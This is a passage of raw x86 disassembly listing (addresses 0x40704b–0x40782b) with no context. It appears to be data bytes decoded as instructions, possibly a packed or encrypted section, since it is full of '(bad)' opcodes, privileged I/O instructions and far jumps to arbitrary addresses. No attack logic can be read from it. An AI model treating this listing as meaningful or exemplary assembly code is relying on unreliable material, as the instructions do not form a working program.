  40704b:	sahf   
  40704c:	stc    
  40704d:	or     BYTE PTR [ebp-0x1b],dh
  407050:	jge    0x406fff
  407052:	sub    dh,BYTE PTR [esi+0x3ccf15f6]
  407058:	pop    eax
  407059:	jne    0x406ffe
  40705b:	(bad)  
  40705c:	fiadd  DWORD PTR [edx+0x65]
  40705f:	mov    bl,BYTE PTR [ebp-0x7e700976]
  407065:	sbb    bl,BYTE PTR [ecx+ebx*4-0x80]
  407069:	cwde   
  40706a:	pop    edx
  40706b:	imul   DWORD PTR ds:0xf15a4f63
  407071:	xor    dh,BYTE PTR [edi-0x120177c2]
  407077:	(bad)  
  407078:	mov    eax,0xc7592633
  40707d:	imul   ecx,DWORD PTR [eax-0x293f7e1f],0x6c784770
  407087:	das    
  407088:	mov    eax,0xc6e4fb35
  40708d:	lahf   
  40708e:	and    BYTE PTR [eax-0x34ff9afa],bl
  407094:	mov    dl,0x40
  407096:	int    0x9e
  407098:	out    0x65,eax
  40709a:	mov    ds:0x4801b6b6,al
  40709f:	popf   
  4070a0:	cmp    ecx,DWORD PTR [edi]
  4070a2:	cld    
  4070a3:	adc    eax,0xff2402cb
  4070a8:	or     esi,DWORD PTR ds:0xd7df0612
  4070ae:	mov    ds:0xcecd1250,eax
  4070b3:	mov    ds:0xa6ad1142,eax
  4070b8:	push   esi
  4070b9:	or     DWORD PTR [edi+esi*4],0xffffffb9
  4070bd:	popa   
  4070be:	push   cs
  4070bf:	push   esi
  4070c0:	call   0xba629b9a
  4070c5:	ins    BYTE PTR es:[edi],dx
  4070c6:	adc    DWORD PTR [esi],ecx
  4070c8:	popa   
  4070c9:	ret    0x227b
  4070cc:	mov    al,0xb1
  4070ce:	imul   ecx,DWORD PTR [edx],0x675c3ea2
  4070d4:	out    dx,eax
  4070d5:	push   es
  4070d6:	(bad)  
  4070d7:	mov    dl,0x89
  4070d9:	mov    ch,0x89
  4070db:	mov    al,ds:0xe0c9d4c5
  4070e0:	or     ch,BYTE PTR ds:0xf9365333
  4070e6:	sar    cl,0xf5
  4070e9:	dec    esi
  4070ea:	mov    al,0xf8
  4070ec:	daa    
  4070ed:	test   DWORD PTR [ebp-0x6884ae76],edi
  4070f3:	mov    dh,0xd1
  4070f5:	mov    ?,WORD PTR [ebx]
  4070f7:	ror    dl,0x12
  4070fa:	jne    0x40711c
  4070fc:	cld    
  4070fd:	pop    edx
  4070fe:	retf   0xd5b8
  407101:	cmp    BYTE PTR [eax],bh
  407103:	sbb    bh,ah
  407105:	test   eax,0xcf2f0402
  40710a:	fistp  QWORD PTR [ecx]
  40710c:	sub    esp,DWORD PTR [edx+0x18]
  40710f:	ins    DWORD PTR es:[edi],dx
  407110:	xchg   dh,bh
  407112:	xor    al,BYTE PTR [eax]
  407114:	push   esi
  407115:	dec    edx
  407116:	push   ebx
  407117:	dec    ecx
  407118:	fsubr  DWORD PTR [ebx]
  40711a:	outs   dx,BYTE PTR ds:[esi]
  40711b:	mov    bh,0x61
  40711d:	leave  
  40711e:	adc    edi,esi
  407120:	or     ah,BYTE PTR [edi]
  407122:	adc    DWORD PTR [edi],ecx
  407124:	pop    esp
  407125:	pop    edi
  407127:	mov    cl,0xbd
  407129:	xor    edx,DWORD PTR [esp+ebx*8+0x5972ad9a]
  407130:	mov    edi,0xe01c487c
  407135:	iret   
  407136:	cmp    al,0x19
  407138:	inc    eax
  407139:	stc    
  40713a:	mov    ds:0x16aa16c9,eax
  40713f:	pop    es
  407140:	sub    DWORD PTR [edi+0x756968a3],esp
  407146:	jo     0x407140
  407148:	mov    ds:0xfec4ce5b,al
  40714d:	int    0xed
  40714f:	xor    edi,DWORD PTR fs:[edx+0x66d2cebd]
  407156:	jno    0x4071a1
  407158:	lods   eax,DWORD PTR ds:[esi]
  407159:	cs pop eax
  40715b:	std    
  40715c:	xor    ecx,DWORD PTR [edi+0x50231a6]
  407162:	retf   
  407163:	sub    al,0x72
  407165:	test   al,0x6a
  407167:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407168:	out    0x6,al
  40716a:	fist   WORD PTR [esi]
  40716c:	pushf  
  40716d:	jl     0x407141
  40716f:	mov    ch,0x98
  407171:	mov    eax,0xfc8a7822
  407176:	jecxz  0x4071db
  407178:	adc    edi,ecx
  40717a:	adc    BYTE PTR [ebx],0x0
  40717d:	ins    BYTE PTR es:[edi],dx
  40717e:	jle    0x4071a3
  407180:	or     ebp,DWORD PTR [edx]
  407182:	ret    0xab89
  407185:	jo     0x40715b
  407187:	daa    
  407188:	xor    esi,DWORD PTR [edx]
  40718a:	mov    dh,0xd5
  40718c:	es inc ebp
  40718e:	xchg   esp,eax
  40718f:	jmp    0x4071b0
  407191:	fdiv   DWORD PTR [esp+ebx*8-0x22075809]
  407198:	nop
  407199:	mov    dl,0x73
  40719b:	push   cs
  40719c:	xchg   ecx,eax
  40719d:	add    al,BYTE PTR [ebp+0x58]
  4071a0:	mov    ds:0x2c1604a1,al
  4071a5:	and    BYTE PTR [eax-0x3ad58f51],ch
  4071ab:	je     0x4071a7
  4071ad:	outs   dx,BYTE PTR ds:[esi]
  4071ae:	mov    DWORD PTR [esp+eax*1+0x3c],0xd1f0e02
  4071b6:	mov    ebx,0x580b5719
  4071bb:	call   0x38b0:0x7138abbe
  4071c2:	cwde   
  4071c3:	mov    ah,0xf8
  4071c5:	jbe    0x40717d
  4071c7:	ficom  DWORD PTR [edi]
  4071c9:	and    al,0x58
  4071cb:	push   ebp
  4071cc:	xor    DWORD PTR [ebp+0x52],eax
  4071cf:	dec    ebx
  4071d0:	jle    0x4071d5
  4071d2:	push   0xffffffa3
  4071d4:	pop    ecx
  4071d5:	cmp    edx,eax
  4071d7:	(bad)  
  4071d8:	jmp    0x39340d67
  4071dd:	adc    eax,0x7d0dfbd7
  4071e2:	dec    ecx
  4071e3:	aas    
  4071e4:	inc    esp
  4071e5:	mov    esi,DWORD PTR [edi]
  4071e7:	repnz test ecx,ebp
  4071ea:	cdq    
  4071eb:	out    dx,eax
  4071ec:	cmc    
  4071ed:	cmp    ecx,DWORD PTR [ebp-0x10fbdbbd]
  4071f3:	(bad)  
  4071f4:	sahf   
  4071f5:	xchg   edi,eax
  4071f6:	scas   al,BYTE PTR es:[edi]
  4071f7:	pop    esi
  4071f8:	lock scas eax,DWORD PTR es:[edi]
  4071fa:	cld    
  4071fb:	push   esi
  4071fc:	out    dx,al
  4071fd:	jmp    0x7cbc:0x629ac02
  407204:	adc    esi,DWORD PTR [esi+0x75]
  407207:	sbb    eax,DWORD PTR [ebx+0x4bcc6254]
  40720d:	adc    ebp,esp
  40720f:	lock mov cl,BYTE PTR [ecx+0x6]
  407213:	sub    dl,BYTE PTR [edi-0x62]
  407216:	sbb    esi,DWORD PTR [edi+0x312b6f23]
  40721c:	fs xchg edi,eax
  40721e:	xor    DWORD PTR [ecx-0x1d],0xabd79cc6
  407225:	xor    eax,0xe15bbd57
  40722a:	jne    0x4071e3
  40722c:	loop   0x40727d
  40722e:	pop    ds
  40722f:	inc    esi
  407230:	(bad)  
  407231:	test   al,0x13
  407233:	push   esi
  407234:	pushf  
  407235:	dec    ecx
  407236:	les    ebp,FWORD PTR ds:0x6c33226
  40723c:	ins    BYTE PTR es:[edi],dx
  40723d:	dec    ebx
  40723e:	fwait
  40723f:	popf   
  407240:	fdivr  QWORD PTR [eax]
  407242:	lods   al,BYTE PTR ds:[esi]
  407243:	xchg   edx,eax
  407244:	shl    BYTE PTR [esi+0x7a51ea0d],cl
  40724a:	and    edx,DWORD PTR [edx]
  40724c:	leave  
  40724d:	rcl    BYTE PTR [ebp+0x77340cb5],1
  407253:	hlt    
  407254:	or     edi,DWORD PTR [ecx]
  407256:	inc    edx
  407257:	call   0x8696:0xead4a7e4
  40725e:	or     eax,0xc037a8ed
  407263:	scas   al,BYTE PTR es:[edi]
  407264:	jno    0x40721d
  407266:	xor    al,bl
  407268:	add    BYTE PTR [ecx-0x76],bh
  40726b:	into   
  40726c:	les    ebx,FWORD PTR [edx+0x45]
  40726f:	das    
  407270:	aam    0xe8
  407272:	cs nop
  407274:	jmp    0xb353:0xfe9f82fe
  40727b:	fstp   QWORD PTR [ebp-0x3]
  40727e:	aad    0xa1
  407280:	lahf   
  407281:	mov    dh,0xc
  407283:	add    bh,ah
  407285:	push   esp
  407286:	das    
  407287:	xor    eax,0x27934363
  40728c:	out    0xd1,al
  40728e:	mov    ah,0x2a
  407290:	xchg   ebp,eax
  407291:	mov    dl,0x37
  407293:	xor    eax,DWORD PTR [esp+edx*8+0x7a]
  407297:	cmp    BYTE PTR [ebx-0x78529336],bl
  40729d:	mov    dh,BYTE PTR [esi]
  40729f:	rcl    BYTE PTR ss:[eax-0x5bd7575d],0xce
  4072a7:	fst    st(1)
  4072a9:	ins    BYTE PTR es:[edi],dx
  4072aa:	out    dx,eax
  4072ab:	and    DWORD PTR [ebp-0x26821138],edx
  4072b1:	mov    ?,ebx
  4072b3:	addr16 push esi
  4072b5:	hlt    
  4072b6:	lock stc 
  4072b8:	xchg   edi,eax
  4072b9:	xchg   edi,eax
  4072ba:	push   ebp
  4072bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072bc:	cmp    edi,esp
  4072be:	mov    dl,0x7
  4072c0:	mov    ah,0x40
  4072c2:	mov    eax,0xdcf5373
  4072c7:	sti    
  4072c8:	(bad)  
  4072c9:	js     0x40733d
  4072cb:	frstor [ebp+0xe5a5332]
  4072d1:	outs   dx,DWORD PTR ds:[esi]
  4072d2:	cmp    DWORD PTR [ecx],edx
  4072d4:	in     eax,0xee
  4072d6:	das    
  4072d7:	fwait
  4072d8:	add    eax,ebx
  4072da:	pop    ebp
  4072db:	cwde   
  4072dc:	or     al,0xf1
  4072de:	mov    al,BYTE PTR [edi-0x25149dd9]
  4072e4:	sbb    esp,DWORD PTR [edi+0x605ac654]
  4072ea:	and    ebp,DWORD PTR [eax]
  4072ec:	or     DWORD PTR [ebx+0x6d],ecx
  4072ef:	mov    eax,0x276a6258
  4072f4:	shl    BYTE PTR [esi],cl
  4072f6:	je     0x4072d5
  4072f8:	icebp  
  4072f9:	(bad)  
  4072fa:	mov    ebp,ecx
  4072fc:	mov    cs,WORD PTR [eax]
  4072fe:	nop
  4072ff:	push   es
  407300:	and    DWORD PTR [ebx-0x3b680633],0xffffffbc
  407307:	sti    
  407308:	xchg   BYTE PTR [ebx+0x2c],dh
  40730b:	xor    ebx,edx
  40730d:	xor    eax,0xe9652838
  407312:	sbb    DWORD PTR ds:0x7debadb9,esp
  407318:	cdq    
  407319:	push   esi
  40731a:	ret    0x5017
  40731d:	cmp    ch,al
  40731f:	(bad)  [esi-0x1f]
  407322:	inc    ebp
  407323:	loope  0x407302
  407325:	pop    edi
  407326:	pop    edx
  407327:	test   BYTE PTR [esi+0x16],bl
  40732a:	pop    ss
  40732b:	in     al,0x3a
  40732d:	test   BYTE PTR [eax],cl
  40732f:	stos   BYTE PTR es:[edi],al
  407330:	pop    edi
  407331:	retf   0xa5e7
  407334:	clc    
  407335:	jae    0x40736e
  407337:	inc    eax
  407338:	test   BYTE PTR ds:0x4e72c763,bh
  40733e:	dec    esi
  40733f:	stos   DWORD PTR es:[edi],eax
  407340:	pop    esi
  407341:	(bad)  
  407342:	in     eax,0xd
  407344:	mov    eax,ds:0x332c2e22
  407349:	xchg   DWORD PTR [edx-0x56],ebp
  40734c:	and    DWORD PTR [ecx],0x28c11047
  407352:	pop    ebx
  407353:	jmp    0x4072e3
  407355:	push   edi
  407356:	push   cs
  407357:	cmp    eax,0x3c8ef3b9
  40735c:	fld    st(4)
  40735e:	stc    
  40735f:	(bad)
  407362:	add    esp,DWORD PTR [edi-0x60cea2f0]
  407368:	js     0x40731b
  40736a:	sbb    edi,DWORD PTR [edx+0x38]
  40736d:	cmp    DWORD PTR [esi+0x5e],ecx
  407370:	loop   0x407361
  407372:	xchg   edi,eax
  407373:	mov    ds:0xd9bae7e2,eax
  407378:	pusha  
  407379:	ffreep st(6)
  40737b:	in     al,dx
  40737c:	mov    DWORD PTR [bx+si-0x7a],ebp
  407380:	stos   DWORD PTR es:[edi],eax
  407381:	mov    ds:0x1810d4cc,eax
  407386:	mov    WORD PTR [eax-0x17],cs
  407389:	dec    ecx
  40738a:	jg     0x4073f1
  40738c:	xor    eax,0xd2a6b7c6
  407391:	mov    DWORD PTR [ecx],ebp
  407393:	pop    ecx
  407394:	mov    dh,0x8f
  407396:	jbe    0x407341
  407398:	xor    BYTE PTR [esi-0x13],dl
  40739b:	rcl    DWORD PTR [ecx+0x1365741c],1
  4073a1:	mov    ?,WORD PTR [edx]
  4073a3:	std    
  4073a4:	icebp  
  4073a5:	push   0x92c5de05
  4073aa:	mov    eax,0x1158d4e1
  4073af:	jmp    0x27077b96
  4073b4:	and    bl,BYTE PTR [edx]
  4073b6:	rcl    DWORD PTR [ebp-0x1752d80a],1
  4073bc:	xchg   esi,eax
  4073bd:	cmp    al,0x1
  4073bf:	repz fs mov esi,0x37c88009
  4073c6:	push   0x36
  4073c8:	cmp    BYTE PTR [ebx-0x13],bh
  4073cb:	fsub   QWORD PTR [edx-0x2b098cb2]
  4073d1:	int3   
  4073d2:	mov    al,0x1c
  4073d4:	outs   dx,BYTE PTR ds:[esi]
  4073d5:	fnstcw WORD PTR [ebx]
  4073d7:	push   ds
  4073d8:	fldenv [edx-0x29d79376]
  4073de:	bound  eax,QWORD PTR [ecx+0x109f25ca]
  4073e4:	xor    DWORD PTR [ebx+0x64c88e17],ebx
  4073ea:	sti    
  4073eb:	push   esp
  4073ec:	aas    
  4073ed:	mov    ebp,0x29a32504
  4073f2:	enter  0xab1c,0x23
  4073f6:	(bad)  
  4073f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073f8:	das    
  4073f9:	xchg   DWORD PTR es:[ecx],eax
  4073fc:	(bad)  
  4073fd:	sti    
  4073fe:	cmp    eax,0x74cab6e2
  407403:	scas   eax,DWORD PTR es:[edi]
  407404:	sbb    eax,DWORD PTR [esi-0x278b1678]
  40740a:	mov    al,0x9b
  40740c:	pop    eax
  40740d:	dec    eax
  40740e:	adc    bh,BYTE PTR [ebx-0x74]
  407411:	sub    BYTE PTR [eax-0x2b1b94ad],ch
  407417:	sub    eax,0xf2e76157
  40741c:	scas   eax,DWORD PTR es:[edi]
  40741d:	sti    
  40741e:	mov    al,ds:0x9a2a1c83
  407423:	into   
  407424:	push   ds
  407425:	xor    dl,BYTE PTR [edx]
  407427:	adc    ax,0x4520
  40742b:	std    
  40742c:	push   DWORD PTR [ebp+0x45]
  40742f:	mov    esp,0x3614d722
  407434:	jg     0x407465
  407436:	std    
  407437:	mov    esi,0xacfe263c
  40743c:	push   cs
  40743d:	fdivr  st,st(3)
  40743f:	out    dx,al
  407440:	(bad)  
  407441:	and    edi,DWORD PTR [ecx-0x6de34710]
  407447:	js     0x407406
  407449:	ja     0x4073fa
  40744b:	loopne 0x40746b
  40744d:	int    0xf6
  40744f:	pop    esp
  407450:	pop    edi
  407451:	in     al,0xa1
  407453:	aaa    
  407454:	jge    0x407455
  407456:	dec    esi
  407457:	scas   eax,DWORD PTR es:[edi]
  407458:	xchg   esi,eax
  407459:	push   cs
  40745a:	sbb    eax,0x8f37c703
  40745f:	pop    ss
  407460:	cs arpl ax,dx
  407463:	add    ch,BYTE PTR [edi+0x2172a48b]
  407469:	dec    ebp
  40746a:	sti    
  40746b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40746c:	mov    eax,ds:0xe9e31272
  407471:	mov    ss,WORD PTR [edi+ecx*1]
  407474:	out    0x15,eax
  407476:	or     ebx,DWORD PTR [eax+esi*4]
  407479:	cwde   
  40747a:	pop    esi
  40747b:	inc    esp
  40747c:	inc    esi
  40747d:	test   al,0x8b
  40747f:	pop    ds
  407480:	je     0x407454
  407482:	hlt    
  407483:	je     0x40741a
  407485:	repz jnp 0x40745a
  407488:	dec    ebp
  407489:	fisubr WORD PTR [ebp+0x6a7291b4]
  40748f:	and    eax,0x21c8b8c6
  407494:	iret   
  407495:	xchg   edi,eax
  407496:	addr16 in al,0xee
  407499:	int3   
  40749a:	add    al,BYTE PTR [esp+esi*2+0x3df516e0]
  4074a1:	inc    eax
  4074a2:	push   cs
  4074a3:	ins    DWORD PTR es:[edi],dx
  4074a4:	in     eax,0xc5
  4074a6:	cmp    bl,cl
  4074a8:	call   0x934e81a2
  4074ad:	scas   eax,DWORD PTR es:[edi]
  4074ae:	fidiv  WORD PTR [ebx+0x28]
  4074b1:	jns    0x4074fe
  4074b3:	cmp    al,0xf1
  4074b5:	push   DWORD PTR cs:[ecx-0x52790c48]
  4074bc:	icebp  
  4074bd:	mov    ds:0x2afe737c,al
  4074c2:	mov    fs,WORD PTR ds:0x5c15df39
  4074c8:	dec    esp
  4074c9:	inc    ebp
  4074ca:	and    DWORD PTR [eax],0xbbbb6f5
  4074d0:	aam    0xcb
  4074d2:	cmp    edi,DWORD PTR [eax+0x1cc7778b]
  4074d8:	imul   eax,DWORD PTR [esi],0xffffffcb
  4074db:	push   ebp
  4074dc:	mov    ah,0xc5
  4074de:	cmp    BYTE PTR [edi-0x5a],bh
  4074e1:	add    DWORD PTR [eax-0x1f],0xffffffe4
  4074e5:	retf   
  4074e6:	pop    eax
  4074e7:	hlt    
  4074e8:	pop    eax
  4074e9:	call   0x565c:0x76b5d5c2
  4074f0:	sti    
  4074f1:	stos   BYTE PTR es:[edi],al
  4074f2:	dec    ebp
  4074f3:	das    
  4074f4:	add    ebx,esi
  4074f6:	mov    edi,0x5ef52a6c
  4074fb:	jmp    0x407505
  4074fd:	mov    BYTE PTR [esi],dl
  4074ff:	ror    BYTE PTR [ecx-0x43],1
  407502:	enter  0xb1f7,0x45
  407506:	adc    esp,DWORD PTR ds:0x1d29a6b6
  40750c:	mov    dh,0xa6
  40750e:	pop    ss
  40750f:	mov    dl,0x53
  407511:	jno    0x4074fb
  407513:	pushf  
  407514:	stos   DWORD PTR es:[edi],eax
  407515:	pusha  
  407516:	or     BYTE PTR [edi+0x592518c],cl
  40751c:	or     ecx,esp
  40751e:	icebp  
  40751f:	repnz clc 
  407521:	jl     0x407542
  407523:	push   edx
  407524:	mov    dl,0xa3
  407526:	das    
  407527:	push   ds
  407528:	rcr    DWORD PTR gs:[edi],1
  40752b:	dec    ebx
  40752c:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40752e:	jo     0x4074fb
  407530:	repz or BYTE PTR [ebp+0x8],cl
  407534:	iret   
  407535:	and    eax,0xd5b79dd6
  40753a:	pushf  
  40753b:	xor    BYTE PTR [edx],bl
  40753d:	gs or  eax,0xd37c416d
  407543:	cmp    eax,0x37b07e4d
  407548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407549:	out    dx,eax
  40754a:	ficom  DWORD PTR [ebx-0x5410f2dd]
  407550:	pop    esp
  407551:	dec    esi
  407552:	cmp    DWORD PTR [ecx-0x49d45fa],esp
  407558:	pop    edi
  407559:	adc    DWORD PTR [edi],ecx
  40755b:	jmp    0x40756f
  40755d:	inc    esp
  40755e:	inc    edi
  40755f:	ret    
  407560:	push   eax
  407561:	sbb    eax,0x502c919c
  407566:	fs pop es
  407568:	cs mov bl,0x64
  40756b:	(bad)  
  40756c:	retf   0x8877
  40756f:	iret   
  407570:	or     ebx,edx
  407572:	mov    edi,0x12225ccc
  407577:	repz lea ecx,[edx-0x70]
  40757b:	not    DWORD PTR [ebx]
  40757d:	pop    esp
  40757e:	or     ah,cl
  407580:	adc    al,0x5a
  407582:	mov    ds,WORD PTR [edx-0x47]
  407585:	sub    ah,BYTE PTR [edi+0x6c434ab3]
  40758b:	mov    dh,dh
  40758d:	mov    al,ds:0x6bf6d3c5
  407592:	retf   0x1180
  407595:	adc    bl,BYTE PTR [ecx+0x3106efc4]
  40759b:	dec    DWORD PTR [ebp-0x5e20fbf8]
  4075a1:	loop   0x4075ca
  4075a3:	pop    eax
  4075a4:	jg     0x4075b1
  4075a6:	or     eax,0xc7105f41
  4075ab:	fcmovnu st,st(5)
  4075ad:	test   DWORD PTR [ebp-0x6c64ccc8],ebx
  4075b3:	je     0x407560
  4075b5:	push   es
  4075b6:	or     DWORD PTR [ebp+0x7d],eax
  4075b9:	stos   DWORD PTR es:[edi],eax
  4075ba:	mov    BYTE PTR [eax+0x9f9f9a7],dl
  4075c0:	cmp    esp,ecx
  4075c2:	popf   
  4075c3:	sbb    eax,0x656e0c47
  4075c8:	sbb    eax,0x476bea47
  4075cd:	nop
  4075ce:	sbb    eax,0x9e041969
  4075d3:	js     0x4075e2
  4075d5:	pop    ecx
  4075d6:	aad    0x4c
  4075d8:	jge    0x4075ca
  4075da:	lds    edx,FWORD PTR [ebp-0x5e]
  4075dd:	sbb    al,0xa9
  4075df:	loope  0x4075aa
  4075e1:	pushf  
  4075e2:	(bad)  
  4075e3:	xor    DWORD PTR [esi+0x451b4513],edi
  4075e9:	sbb    dl,ch
  4075eb:	(bad)  
  4075ed:	ret    
  4075ee:	mov    al,0x1a
  4075f0:	mov    ?,WORD PTR [ecx+0x10]
  4075f3:	lods   al,BYTE PTR ds:[esi]
  4075f4:	pusha  
  4075f5:	in     al,dx
  4075f6:	(bad)  
  4075f7:	push   esi
  4075f8:	cmp    eax,0xe5d93df9
  4075fd:	ins    DWORD PTR es:[edi],dx
  4075fe:	xor    DWORD PTR [ebx-0x5833ecb7],0x269b57fc
  407608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407609:	mov    WORD PTR [ebx-0x38],ss
  40760c:	sahf   
  40760d:	pop    es
  40760e:	xlat   BYTE PTR ds:[ebx]
  40760f:	je     0x40766b
  407611:	xor    al,0x25
  407613:	daa    
  407614:	xor    al,ah
  407616:	aad    0x3e
  407618:	or     bh,BYTE PTR [ebx]
  40761a:	xor    bh,ah
  40761c:	sahf   
  40761d:	fwait
  40761e:	inc    ebp
  40761f:	stos   BYTE PTR es:[edi],al
  407620:	adc    eax,0x7017b6
  407625:	mov    esi,DWORD PTR [esi+0x51]
  407628:	(bad)  
  407629:	or     eax,0xe1ac2a91
  40762e:	sbb    ebp,edi
  407630:	mov    BYTE PTR [ebx],cl
  407632:	push   cs
  407633:	retf   
  407634:	cmp    ecx,DWORD PTR [esi+0x5e]
  407637:	pop    ss
  407638:	mov    ecx,0x8fe6b283
  40763d:	std    
  40763e:	ss add eax,0xc7567f6f
  407644:	dec    ax
  407646:	pop    edi
  407647:	xor    BYTE PTR [ebx+ebp*4+0x4f],cl
  40764b:	mov    bh,0x4b
  40764d:	push   ds
  40764e:	fld    QWORD PTR [edx-0x41]
  407651:	daa    
  407652:	test   eax,eax
  407654:	jle    0x4076ce
  407656:	scas   al,BYTE PTR es:[edi]
  407657:	ficom  DWORD PTR [ecx+0x3c]
  40765a:	ins    BYTE PTR es:[edi],dx
  40765b:	pop    ebp
  40765c:	popa   
  40765d:	or     BYTE PTR ds:0xf8ee4f5,bl
  407663:	es push ecx
  407665:	(bad)  
  407666:	adc    DWORD PTR [eax+0x5e68b5e],esp
  40766c:	cmp    eax,0x68e08fe1
  407671:	cmp    eax,0xa470d0c1
  407676:	pusha  
  407677:	jae    0x40765d
  407679:	cs ja  0x407610
  40767c:	leave  
  40767d:	(bad)  
  40767e:	fsubr  st,st(2)
  407680:	mov    ch,0xe
  407682:	loop   0x40767e
  407684:	in     eax,dx
  407685:	lods   eax,DWORD PTR ds:[esi]
  407686:	jne    0x40766f
  407688:	fbld   TBYTE PTR [ebx-0x25]
  40768b:	loopne 0x407656
  40768d:	jp     0x407612
  40768f:	mov    esi,0xedca23a1
  407694:	mov    ecx,eax
  407696:	jl     0x4076e9
  407698:	pop    esi
  407699:	cmp    ch,BYTE PTR [edx]
  40769b:	jecxz  0x4076fa
  40769d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40769e:	mov    edx,DWORD PTR [edi-0x22]
  4076a1:	test   BYTE PTR [ebp+0x7f],cl
  4076a4:	jle    0x4076c6
  4076a6:	or     al,0x69
  4076a8:	dec    eax
  4076a9:	push   ebx
  4076aa:	jg     0x4076ee
  4076ac:	mov    ds:0x1ac5f4ae,al
  4076b1:	dec    edi
  4076b2:	lds    edi,FWORD PTR [ecx]
  4076b4:	ins    DWORD PTR es:[edi],dx
  4076b5:	add    esi,DWORD PTR [edi+eiz*1+0x57]
  4076b9:	add    cl,cl
  4076bb:	xor    al,0x3a
  4076bd:	nop
  4076be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076bf:	sahf   
  4076c0:	and    BYTE PTR [edi+0x3ca9c18f],al
  4076c6:	imul   eax,DWORD PTR [ecx],0xb151c21e
  4076cc:	outs   dx,DWORD PTR ds:[esi]
  4076cd:	and    BYTE PTR [edi],dl
  4076cf:	cdq    
  4076d0:	sti    
  4076d1:	sub    al,0xb2
  4076d3:	shl    BYTE PTR [eax-0x7d],cl
  4076d6:	sbb    al,0x65
  4076d8:	push   edx
  4076d9:	lds    esp,FWORD PTR [edi-0x1b0bd77a]
  4076df:	and    DWORD PTR [esi+eiz*8],ebp
  4076e2:	and    eax,DWORD PTR [ecx]
  4076e4:	std    
  4076e5:	loopne 0x4076e9
  4076e7:	mov    cl,0xd5
  4076e9:	adc    DWORD PTR [eax+ebx*1+0x17],0x2b99514b
  4076f1:	xor    eax,0x2c2cf320
  4076f6:	pop    ebp
  4076f7:	pop    ebx
  4076f8:	add    ebp,ecx
  4076fa:	cmp    ebp,DWORD PTR [edi+0xfb33595]
  407700:	dec    edi
  407701:	xchg   esi,eax
  407702:	xchg   esi,eax
  407703:	mov    ebx,0xe551a28b
  407708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407709:	push   esi
  40770a:	bound  edx,QWORD PTR [esi+0x3e]
  40770d:	call   0xdce0:0x8d8ea4ce
  407714:	retf   
  407715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407716:	imul   edi,ebx,0xd5882fe3
  40771c:	pusha  
  40771d:	inc    ecx
  40771e:	cmp    DWORD PTR [ebx-0x432f1fde],0xffffffc3
  407725:	dec    ecx
  407726:	push   ebx
  407727:	push   ecx
  407728:	ds imul ebx,edi,0xcaa45e45
  40772f:	or     eax,0x3cb37986
  407734:	cmp    al,0xe9
  407736:	popf   
  407737:	fs cmp al,0xaf
  40773a:	push   edx
  40773b:	sti    
  40773c:	or     eax,edx
  40773e:	push   esp
  40773f:	jae    0x407783
  407741:	or     al,0xc9
  407743:	pop    ecx
  407744:	cmp    al,BYTE PTR [ebx+0x39]
  407747:	mov    eax,ds:0x4294123f
  40774c:	(bad)  
  40774d:	fldln2 
  40774f:	nop
  407750:	xor    al,0x5b
  407752:	call   0x455331e0
  407757:	xor    BYTE PTR [ecx+0x5b],0x44
  40775b:	leave  
  40775c:	fist   DWORD PTR [eax+eiz*2-0x1f494c1f]
  407763:	loop   0x40778f
  407765:	and    BYTE PTR [ecx],ch
  407767:	add    DWORD PTR [esi-0x3337ad50],ebx
  40776d:	fcom   DWORD PTR [esi+0x3e]
  407770:	xor    ebx,DWORD PTR [ebx+edi*1]
  407773:	dec    esp
  407774:	dec    ebp
  407775:	into   
  407776:	dec    ebx
  407777:	sub    DWORD PTR [ecx],eax
  407779:	pop    eax
  40777a:	call   0xccbe:0xdd1f0b1
  407781:	sub    esp,ecx
  407783:	jmp    0x407804
  407785:	popf   
  407786:	adc    BYTE PTR [edi],dl
  407788:	mov    WORD PTR [ecx-0x6d1ef989],es
  40778e:	ins    DWORD PTR es:[edi],dx
  40778f:	fcmovnbe st,st(3)
  407791:	aad    0x3c
  407793:	daa    
  407794:	dec    edx
  407795:	pusha  
  407796:	loope  0x4077a9
  407798:	mov    bh,0x8e
  40779a:	hlt    
  40779b:	push   cs
  40779c:	and    esp,eax
  40779e:	mov    al,0xbf
  4077a0:	iret   
  4077a1:	pushf  
  4077a2:	lea    edi,ds:0x3ec29197
  4077a8:	push   edx
  4077a9:	and    bl,BYTE PTR [edx]
  4077ab:	pop    esp
  4077ac:	push   esi
  4077ad:	(bad)
  4077b1:	adc    eax,0xd771fc50
  4077b6:	jmp    0xa3da:0xeefeb6c0
  4077bd:	mov    ds:0x474df75,al
  4077c2:	mov    dh,0x3d
  4077c4:	call   0xaa77:0xbb029365
  4077cb:	sar    DWORD PTR [eax-0x197d859],0xae
  4077d2:	or     DWORD PTR es:[ebx+eax*1],esp
  4077d6:	popf   
  4077d7:	jle    0x4077d5
  4077d9:	pop    ss
  4077da:	sbb    eax,0x4c8edb04
  4077df:	(bad)  
  4077e0:	(bad)  [edi]
  4077e2:	xor    eax,0xa19e1217
  4077e7:	(bad)  
  4077e8:	cmp    BYTE PTR [ebp+eax*8-0x43dcd285],bh
  4077ef:	(bad)  
  4077f1:	iret   
  4077f2:	arpl   WORD PTR [ebx-0x6097c7fc],bp
  4077f8:	popf   
  4077f9:	enter  0xcf2f,0xd1
  4077fd:	clc    
  4077fe:	out    dx,eax
  4077ff:	pop    ebx
  407800:	in     al,0x33
  407802:	js     0x4077a4
  407804:	out    0x3e,eax
  407806:	retf   
  407807:	push   ebp
  407808:	mov    ebx,0x28a229a1
  40780d:	ret    0x49ba
  407810:	mov    bh,0x9c
  407812:	sar    DWORD PTR [ecx+0x17],0x2b
  407816:	dec    ebx
  407817:	mov    dh,0x92
  407819:	xor    dl,BYTE PTR [esi+eiz*2-0x33]
  40781d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40781e:	sbb    DWORD PTR [edx],esp
  407820:	cmp    BYTE PTR [esi],bl
  407822:	rol    DWORD PTR [eax+eax*2-0x7e],0xa1
  407827:	inc    ebp
  407828:	cld    
  407829:	add    al,0x10
  40782b:	push   es
